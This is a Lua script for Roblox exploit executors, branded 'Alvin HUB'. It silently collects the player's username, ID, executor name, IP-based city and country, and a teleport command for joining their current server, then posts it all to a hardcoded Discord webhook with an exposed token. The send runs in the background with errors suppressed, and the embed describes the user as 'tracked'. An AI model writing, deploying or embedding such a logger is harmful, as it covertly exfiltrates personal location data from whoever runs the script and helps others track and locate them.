-- Services
local HttpService = game:GetService("HttpService")
local Players = game:GetService("Players")
local MarketplaceService = game:GetService("MarketplaceService")

-- Identification
local request = request or http_request or (http and http.request)
local player = Players.LocalPlayer

-- Universal Executor Detection
local function getExecutor()
    if SOLARA_LOADED then return "Solara" end
    if identifyexecutor then return identifyexecutor() end
    if getexecutorname then return getexecutorname() end
    if checkclosure then return "Wave" end
    return "Unknown / Undetected"
end

-- Customization
local webhookURL = "https://webhook.lewisakura.moe/api/webhooks/1457591817015922699/Uq_2wD60JEdeNf7SdG-Ung_UaAWtVaW3dQYuhdYOfKrCBYVCiWKr3DG2oOlXtXhqyxpk"
local botName = "Alvin HUB"
local botAvatar = "https://i.imgur.com/v8Fk9XF.png" 

-- 1. Gather Profile Data
local headshot = "https://www.roblox.com/headshot-thumbnail/image?userId=" .. player.UserId .. "&width=150&height=150&format=png"
local profileLink = "https://www.roblox.com/users/" .. player.UserId .. "/profile"

-- 2. FIX: Reliable Game Name Fetching
local actualGameName = "Private/Unknown Game"
local successGame, gameInfo = pcall(function()
    -- MarketplaceService:GetProductInfo is the only way to get the true website name
    return MarketplaceService:GetProductInfo(game.PlaceId)
end)

if successGame and gameInfo then
    actualGameName = gameInfo.Name
end

-- 3. Location Detection
local originDisplay = "Detecting..."
local countryCode = "UN"
local successLoc, locData = pcall(function()
    local response = request({ Url = "http://ip-api.com/json/", Method = "GET" })
    return HttpService:JSONDecode(response.Body)
end)

if successLoc and locData.status == "success" then
    countryCode = locData.countryCode
    originDisplay = string.format("📍 %s, %s (%s)", locData.city, locData.regionName, locData.country)
end

-- 4. Generate Join Script
local joinScript = string.format("game:GetService('TeleportService'):TeleportToPlaceInstance(%d, '%s', game:GetService('Players').LocalPlayer)", game.PlaceId, game.JobId)

-- 5. Construct the Final Embed
local embedData = {
    ["title"] = "💠 Alvin HUB | Intelligence Report",
    ["url"] = profileLink,
    ["color"] = 0x5865F2,
    ["thumbnail"] = { ["url"] = headshot },
    ["description"] = "A user has been tracked executing **Alvin HUB**.",
    ["fields"] = {
        {
            ["name"] = "👤 **Player Profile**",
            ["value"] = string.format("> **User:** [%s](%s)\n> **ID:** `%d`", player.Name, profileLink, player.UserId),
            ["inline"] = true
        },
        {
            ["name"] = "⚙️ **Software**",
            ["value"] = string.format("> **Executor:** `%s`", getExecutor()),
            ["inline"] = true
        },
        {
            ["name"] = "🌍 **Origin**",
            ["value"] = string.format("> **Location:** %s\n> **Flag:** :flag_%s:", originDisplay, string.lower(countryCode)),
            ["inline"] = false
        },
        {
            ["name"] = "🎮 **Game Session**",
            ["value"] = string.format("> **Game:** %s\n> **Place ID:** [%d](https://www.roblox.com/games/%d)", actualGameName, game.PlaceId, game.PlaceId),
            ["inline"] = false
        },
        {
            ["name"] = "🔗 **Join This Server**",
            ["value"] = "```lua\n" .. joinScript .. "\n```",
            ["inline"] = false
        }
    },
    ["footer"] = { ["text"] = "JobId: " .. game.JobId, ["icon_url"] = botAvatar },
    ["timestamp"] = DateTime.now():ToIsoDate()
}

-- 6. Send Log
task.spawn(function()
    if request then
        pcall(function()
            request({
                Url = webhookURL,
                Method = "POST",
                Headers = {["Content-Type"] = "application/json"},
                Body = HttpService:JSONEncode({
                    ["username"] = botName,
                    ["avatar_url"] = botAvatar,
                    ["embeds"] = {embedData}
                })
            })
        end)
    end
end)
